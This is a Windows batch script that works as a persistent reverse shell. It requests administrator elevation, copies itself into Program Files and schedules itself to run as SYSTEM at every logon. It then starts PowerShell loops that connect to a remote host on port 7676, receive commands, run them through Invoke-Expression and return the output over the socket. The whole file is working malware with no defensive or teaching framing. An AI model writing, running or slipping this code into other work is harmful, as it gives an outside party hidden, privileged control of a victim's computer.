@echo off 
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b) 
mkdir C:\"Program Files"\AAA
copy %0 C:\"Program Files"\AAA\ 
schtasks /create /F /ru "SYSTEM" /sc onlogon /tn BatSocket /rl highest /tr "\"C:\Program Files\AAA\socket.bat"\" 
start powershell -Command "$FTPServer = '192.168.0.133';$FTPPort = '7676';$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);$tcpStream = $tcpConnection.GetStream();$reader = New-Object System.IO.StreamReader($tcpStream);$writer = New-Object System.IO.StreamWriter($tcpStream);$writer.AutoFlush = $true;$inputCounter = 0;$outputCounter = 0;$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;while ($tcpConnection.Connected) {    while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {           $path = -join('C:\Program Files\AAA\input', $inputCounter,'.txt');        Set-Content -Path $path -Value $reader.ReadLine();        $inputCounter+=1;    };    $pathOutput = -join('C:\Program Files\AAA\output',$outputCounter,'.txt');    if(Test-Path $pathOutput){        $output = Get-Content $pathOutput;        if($output.length -ge 1){            Foreach($s in $output){                $writer.WriteLine($s);            };          };        $outputCounter+=1;        Remove-Item $pathOutput;    };    start-sleep -Milliseconds 120;};$reader.Close();$writer.Close();$tcpConnection.Close();"
start powershell -Command "$counterInput = 0;$counterOutput = 0;while (1) {    $path = -join('C:\Program Files\AAA\input',$counterInput, '.txt');        if(Test-Path $path){        $input = Get-Content $path;        if($input.length -ge 1){            $outputPath = -join('C:\Program Files\AAA\output', $counterOutput, '.txt');            $output = Invoke-Expression $input;            $joinedOutput = '';            Foreach($s in $output){                $joinedOutput+= $s;                $joinedOutput+=[environment]::NewLine;            };            Set-Content -Path $outputPath -Value $joinedOutput;        };                $counterInput+=1;        $counterOutput+=1;        Remove-Item $path;    };            start-sleep -Milliseconds 120;};"
pause 
